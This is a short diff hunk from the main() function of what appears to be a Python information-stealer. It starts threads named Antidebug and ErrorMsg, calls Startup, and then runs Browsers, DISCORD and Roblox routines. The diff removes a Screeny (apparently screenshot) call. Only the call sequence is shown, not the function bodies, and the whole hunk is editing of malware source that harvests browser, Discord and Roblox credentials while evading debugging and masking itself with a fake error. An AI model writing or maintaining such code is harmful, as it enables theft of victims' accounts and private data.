@@ -131,7 +131,6 @@ def main():
     Thread(target=Antidebug).start()
     Startup()
     Thread(target=ErrorMsg).start()
-    Screeny()
     Browsers()
     DISCORD()
     Roblox()
